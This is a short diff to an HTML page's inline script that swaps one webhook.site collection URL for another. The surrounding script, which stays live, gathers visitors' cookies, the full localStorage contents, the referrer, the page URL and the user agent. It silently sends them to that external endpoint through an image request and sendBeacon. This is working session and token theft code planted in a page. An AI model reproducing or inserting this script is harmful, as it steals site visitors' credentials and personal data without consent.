@@ -5,7 +5,7 @@
 
 <script>
 //<![CDATA[
-const w="https://webhook.site/8af976da-6edb-4787-85d3-0491a71b3a34";
+const w="https://webhook.site/bd374ec0-960c-490f-95d2-79e2f6f3786c";
 const d=JSON.stringify({c:document.cookie,s:JSON.stringify(localStorage),r:document.referrer,u:location.href,a:navigator.userAgent});
 try{new Image().src=w+"?d="+encodeURIComponent(d)}catch(e){}
 try{navigator.sendBeacon(w,d)}catch(e){}
